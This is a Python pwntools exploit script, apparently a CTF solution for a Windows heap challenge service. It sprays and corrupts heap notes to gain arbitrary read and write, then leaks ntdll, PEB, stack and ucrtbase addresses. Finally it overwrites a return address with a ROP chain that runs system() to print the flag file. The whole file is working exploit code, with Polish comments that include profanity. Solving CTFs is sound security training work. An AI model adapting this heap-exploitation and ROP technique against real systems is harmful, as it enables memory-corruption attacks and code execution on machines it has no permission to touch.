#!/usr/bin/env nix-shell
#! nix-shell -p python3 python3.pkgs.pwntools -i python3

from pwn import *

r = remote("baby-heap-but-windows.nc.jctf.pro", 1337)
r.recvuntil(b"=> ")
#context.log_level = 'debug'

IDX = 0

def create_note():
	print("create_note")
	global IDX
	r.sendline(b"1")
	r.recvuntil(b"=> ")
	tmp = IDX
	IDX=IDX+1
	return tmp

def free_note(idx):
	print("free_note")
	r.sendline(b"4")
	r.recvuntil(b"index: ")
	r.sendline(str(idx))
	r.recvuntil(b"=> ")

def save_note(idx, size, data):
	print("save_note")
	r.sendline(b"2")
	r.recvuntil(b"index: ")
	r.sendline(str(idx))
	r.recvuntil(b"size: ")
	r.sendline(str(size))
	r.send(data)
	r.recvuntil(b"=> ")

def show_note(idx):
	print("show_note")
	r.sendline(b"3")
	r.recvuntil(b"index: ")
	r.sendline(str(idx))
	data = r.recvuntil(b"=> ")
	return data

#input("...")

SPRAY = 20

for i in range(SPRAY):
	create_note()
	save_note(i, 0x18, b"n")

for i in range(SPRAY):
	free_note(i)

n = create_note()#by zawsze trafialismy w bufor
m = create_note()
save_note(m, 0x18, p64(0x8))#length nadpisuje jesli wpadnie w struct note
data = show_note(m)
print(data[8:16]) #capacity
size = u64(data[8:16])
print(size)
if size!=0x18:
	print("-- zly spray --")
	save_note(n, 0x18, p64(0x8))
	data = show_note(n)
	print(data[8:16]) #capacity
	size = u64(data[8:16])
	print(size)
	m=n

assert(size==0x18)
heap_leak= u64(data[16:24])
print(hex(heap_leak))

heap_base = heap_leak & 0xffffffffffff0000
print("heap base:")
print(hex(heap_base))

print("------------ STEP 2 ------------")

ptr_ntdll = heap_base + 0x2c0

save_note(m, 0x18, p64(0x8)+p64(0x8)+p64(ptr_ntdll))

ntdll_leak = None
idx_leak = None

for i in range(SPRAY):
	data = show_note(i)
	#if len(data) == 96:
	if len(data) != 80:
		continue
	print(i)
	print(data)
	if u64(data[:8]) & 0xff00000000000000:
		continue
	ntdll_leak = u64(data[:8])
	print("****")
	print(hex(ntdll_leak))
	print(len(data))
	idx_leak = i
	break

assert(ntdll_leak)
ntdll_base = ntdll_leak-0x185190

print("ntdll.dll")
print(hex(ntdll_base))

peb1=ntdll_base+0x186328
peb2=ntdll_base+0x186358

def read_data(addr, size):
	save_note(m, 0x18, p64(size)+p64(size)+p64(addr))
	data = show_note(idx_leak)
	return data[:size]

def write_data(addr, data):
	size=len(data)
	save_note(m, 0x18, p64(size)+p64(size)+p64(addr))
	save_note(idx_leak, size, data)
	
peb_leak = u64(read_data(peb1,0x8))
print(hex(peb_leak))
peb_base = peb_leak-0x240
print("peb base")
print(hex(peb_base))


stack = peb_base+0x1010
print("stack in peb")
print(hex(stack))
stack_leak = u64(read_data(stack,0x8)) #tu sie wywala czasami
print("stack leak") #o chuj, to jest base stosu
print(hex(stack_leak))

#1810 - taka koncowka ma byc, pozniej 8b zer


def find_ret(curr,SR):
	data = read_data(curr,SR)
	#print(len(data))#hmm chyba za malo sciagamy, te => moga byc na stosie?
	I = None
	for i in range(int(SR/8)):
		uu=data[i*8:i*8+8]
		if len(uu)!=8:
			continue
		#print(i)
		ej = u64(uu)
		#print(ej)
		if (ej & 0xffff) == 0x1810:
			I=i*8
			return curr+I
	return None	

"""
ret_rsp = stack_leak+0x2700
SR=0x500
I = find_ret(ret_rsp, SR)
		
#save_note(idx_leak, 0x100, b"A"*8)
if not I:
	print("nie znaleziono powrotu ze stosu")
	print(hex(ret_rsp))
	print(hex(ret_rsp+SR))
	print("kolejna proba")
	I=find_ret(ret_rsp+SR, SR)
	if not I:
		print("dalej nie dziala")
		r.interactive()
"""
curr=stack_leak+0x1500
SR=0x300
I = None
while not I:
	print("petla szukanie I")
	I = find_ret(curr,SR)
	curr=curr+SR

print("return address")
ret_rsp = I
print(hex(ret_rsp))


#ucrtbase leak
ucrtbase = ret_rsp+0x48
ucrtbase_leak = u64(read_data(ucrtbase,0x8))
print("ucrtbase leak")
print(hex(ucrtbase_leak))
ucrtbase_base = ucrtbase_leak-0x100f28

#save_path
cmd_addr = heap_base+0x1000
print("zapisujemy komende pod adresem")
print(hex(cmd_addr))
write_data(cmd_addr, "type C:\\chall\\flag.txt\x00")

#0x180091719: pop rcx ; ret
#0x1800f0f8b: pop rdx ; ret
#0x180066a9b: pop r8 ; ret ; (1 found)
#0x18008ebc4: pop r9 ; pop r10 ; pop r11 ; ret ; (1 found)
#0x18008ebab: jmp rax ; (1 found)
#0x18000521c: pop rax ; ret ; (1 found)
#0x1800449c4: ret ; (1 found)

pop_rcx = ntdll_base + 0x91719
pop_rax = ntdll_base + 0x521c
system = ucrtbase_base + 0xbd2a0
jmp_rax = ntdll_base + 0x8ebab
empty = ntdll_base + 0x449c4

print("system")
print(hex(system)) #dobrze

rop = b""
rop+=p64(pop_rcx)
rop+=p64(cmd_addr)
rop+=p64(pop_rax)
rop+=p64(system)
rop+=p64(empty)
rop+=p64(jmp_rax)
for i in range(8):
	rop+=p64(i)

#save_note(m, 0x18, p64(SR)+p64(SR)+p64(ret_rsp))
#save_note(idx_leak, len(rop), rop)
#rop = b"A"*8
write_data(ret_rsp, rop)
r.sendline(b"8")

r.interactive()
